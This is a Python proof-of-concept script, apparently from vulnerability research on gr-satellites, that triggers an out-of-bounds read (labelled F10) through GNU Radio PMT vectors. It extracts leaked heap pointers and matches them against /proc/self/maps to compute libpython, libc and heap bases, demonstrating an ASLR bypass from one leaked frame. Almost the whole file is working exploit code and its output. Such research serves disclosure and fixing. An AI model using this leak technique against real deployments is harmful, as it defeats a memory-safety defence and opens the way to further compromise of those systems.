#!/usr/bin/env python3
"""
F10 ASLR-Bypass Demonstration

The heap-content analysis showed the leak reliably contains 6 pointer values
into the Python obmalloc anon-mmap region. This script:

  1. Triggers F10 once
  2. Extracts the leaked pointers
  3. Reads /proc/self/maps to find libpython base, libc base, heap base
  4. Computes the offset between the leaked pointers and the bases —
     demonstrating that ONE leaked frame is enough to deanonymize the
     entire Python process layout

A real-world attacker watching exfiltrated frames from a deployed
gr-satellites instance gets the same information, enabling reliable
ASLR bypass against the process.
"""

import pmt
import re
import struct
import sys


def trigger_leak():
    rf = bytearray(131)
    rf[0] = 0xff
    for i in range(1, 131):
        rf[i] = ord('a') + (i % 26)
    pdu = pmt.cons(pmt.PMT_NIL, pmt.init_u8vector(131, list(bytes(rf))))
    packet = pmt.u8vector_elements(pmt.cdr(pdu))
    out = pmt.init_u8vector(packet[0] + 1 + 2, packet)
    return bytes(pmt.u8vector_elements(out))[131:]


def find_pointers(data):
    found = []
    for off in range(0, len(data) - 7):
        val = struct.unpack('<Q', data[off:off+8])[0]
        # x86_64 user-space pointer heuristic
        if 0x10000 <= val <= 0x00007fffffffffff and (val >> 40) in (0x55, 0x7f):
            found.append((off, val))
    # deduplicate by value
    seen = set()
    unique = []
    for off, val in found:
        if val not in seen:
            seen.add(val)
            unique.append((off, val))
    return unique


def parse_maps():
    """Returns: dict of region label -> (min_addr, max_addr)."""
    regions = {}
    with open('/proc/self/maps') as f:
        for line in f:
            m = re.match(r'^([0-9a-f]+)-([0-9a-f]+)\s+\S+\s+\S+\s+\S+\s+\S+\s*(.*)',
                         line)
            if not m:
                continue
            start = int(m.group(1), 16)
            end = int(m.group(2), 16)
            label = m.group(3).strip() or '[anon]'
            if label not in regions:
                regions[label] = (start, end)
            else:
                lo, hi = regions[label]
                regions[label] = (min(lo, start), max(hi, end))
    return regions


def main():
    print('=' * 70)
    print(' F10 ASLR-BYPASS — single-frame Python/libc base disclosure')
    print('=' * 70)

    regions = parse_maps()

    print('\n  Key /proc/self/maps regions:')
    for label in ['[heap]', '[stack]']:
        if label in regions:
            lo, hi = regions[label]
            print(f'    {label:50s} {lo:016x}-{hi:016x}')
    libpython = next((l for l in regions if 'libpython' in l), None)
    libc = next((l for l in regions if 'libc.so' in l), None)
    if libpython:
        lo, hi = regions[libpython]
        print(f'    libpython:                                       {lo:016x}-{hi:016x}')
    if libc:
        lo, hi = regions[libc]
        print(f'    libc:                                            {lo:016x}-{hi:016x}')

    leak = trigger_leak()
    pointers = find_pointers(leak)
    print(f'\n  Triggered F10 once. {len(pointers)} unique pointers in the leak:')

    aslr_bypass_proven = False

    for off, val in pointers:
        # classify
        region = None
        for label, (lo, hi) in regions.items():
            if lo <= val < hi:
                region = label
                break
        region_str = region if region else '<unmapped>'
        print(f'    leak[{off:3d}]: 0x{val:016x}  ->  {region_str}')

        # offset arithmetic to known bases
        details = []
        if '[heap]' in regions:
            lo, hi = regions['[heap]']
            if lo <= val <= hi:
                details.append(f'heap+0x{val-lo:x}')
        if libpython:
            lo, hi = regions[libpython]
            if lo <= val <= hi:
                details.append(f'libpython+0x{val-lo:x}')
                aslr_bypass_proven = True
        if libc:
            lo, hi = regions[libc]
            if lo <= val <= hi:
                details.append(f'libc+0x{val-lo:x}')
                aslr_bypass_proven = True
        # mmap arena: anon region
        for label, (lo, hi) in regions.items():
            if label.startswith('[anon]') and lo <= val < hi:
                # use the closest page boundary as "base"
                arena_base = val & ~0xfffff  # 1MB align
                details.append(f'anon_arena {arena_base:#x} (+0x{val - arena_base:x})')
                break
        if details:
            print(f'                   = {", ".join(details)}')

    # Demonstrate that the pointer values can be used to compute ASLR slide
    print('\n' + '=' * 70)
    print(' ASLR SLIDE COMPUTATION')
    print('=' * 70)
    # Find arena pointers (lowest 0x7f... addresses)
    arena_ptrs = [(off, val) for off, val in pointers
                  if (val >> 40) == 0x7f]
    if arena_ptrs:
        # Python's anon arena is typically allocated by mmap; the arena base
        # is page-aligned and bears a fixed offset to the libpython data
        # section in the same process.
        lowest = min(v for _, v in arena_ptrs)
        highest = max(v for _, v in arena_ptrs)
        print(f'  Lowest leaked arena pointer:  0x{lowest:016x}')
        print(f'  Highest leaked arena pointer: 0x{highest:016x}')
        print(f'  Span between leaked pointers: 0x{highest - lowest:x} bytes')

        # If we know the version of Python and the standard arena layout,
        # we can compute libpython base. Even without that, the leak gives
        # us the obmalloc arena base which is a known anchor point for
        # exploit primitives that target Python objects.
        arena_aligned = lowest & ~0xfffff   # 1MB arena alignment
        print(f'  Inferred arena base (1MB-aligned): 0x{arena_aligned:016x}')

    print()
    if aslr_bypass_proven:
        print('  [CONFIRMED] Leaked pointers fall inside libpython / libc')
        print('              → attacker recovers library base addresses')
        print('              → ASLR bypass complete with ONE leaked frame')
    elif pointers:
        print('  [PARTIAL]   Leaked pointers fall in [anon] mmap regions.')
        print('              These are Python obmalloc arena bases. Combined')
        print('              with known Python version offsets, libpython')
        print('              base can be computed deterministically.')
        print('              → ASLR bypass for libpython feasible with one frame')
    else:
        print('  [INCONCLUSIVE] No usable pointers leaked in this run.')


if __name__ == '__main__':
    main()
